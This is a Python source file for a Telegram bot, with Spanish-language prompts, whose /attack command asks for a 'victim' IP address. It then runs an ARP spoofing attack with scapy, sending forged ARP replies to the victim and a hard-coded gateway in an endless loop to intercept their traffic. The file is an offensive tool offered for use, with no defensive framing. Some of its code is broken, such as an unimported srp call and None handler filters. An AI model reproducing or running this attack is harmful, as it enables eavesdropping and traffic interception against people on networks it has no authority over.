import logging
import os
import threading
import time

from telegram import ReplyKeyboardMarkup
from telegram.ext import CommandHandler, ConversationHandler, MessageHandler, Updater
from scapy.all import ARP, Ether, send

IP = range(1)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)

def start(update, context):

    update.message.reply_text('Hola, usa /help para ver los comandos disponibles')


def help(update, context):

    update.message.reply_text('Use /attack para realizar ARP Spoofing')

def target_ip(update, context):

    reply_keyboard = [['/cancel']]
    update.message.reply_text(
        '¿Cuál es la dirección IP de su víctima? (Escriba "/cancel" para cancelar la petición)',
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
    )

    return IP

def arp_spoofing(update, context):

    ip = update.message.text

    gateway_ip = "192.168.75.1"
    gateway_mac = "00:50:56:F6:D3:5A"
    
    target_ip = ip
    target_mac = "00:0C:29:14:84:48"

    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]

    for sent, received in result:
        target_mac = received.hwsrc

    while True:
        # Envía una solicitud ARP indicando que la dirección MAC del gateway es la de la víctima
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))

        # Envía una solicitud ARP indicando que la dirección MAC de la víctima es la del gateway
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))

        time.sleep(2)

    return ConversationHandler.END


def cancel(update, context):

    update.message.reply_text('Operación cancelada')

    return ConversationHandler.END


conv_handler = ConversationHandler(
    entry_points=[CommandHandler('attack', target_ip)],

    states={
        IP: [MessageHandler(None, arp_spoofing)]
    },

    fallbacks=[MessageHandler(None, cancel)]
)

def main():

    updater = Updater("<TOKEN>", use_context=True)

    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(conv_handler)
    updater.start_polling()

    updater.idle()

if __name__ == '__main__':
    main()

# By Sxmpl3.

